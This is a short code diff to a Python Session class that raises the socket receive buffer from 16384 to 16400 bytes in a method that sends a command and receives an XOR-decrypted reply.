@@ -72,7 +72,7 @@ class Session:
        
         if(CheckConn().sendsafe(self.session_nb, self.socket, cmd)): #send data
         
-            CheckConn().recvcommand(self.socket,16384) #XOR  The decryption of xor is automatic on this method.
+            CheckConn().recvcommand(self.socket,16400) #XOR  The decryption of xor is automatic on this method.
             
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
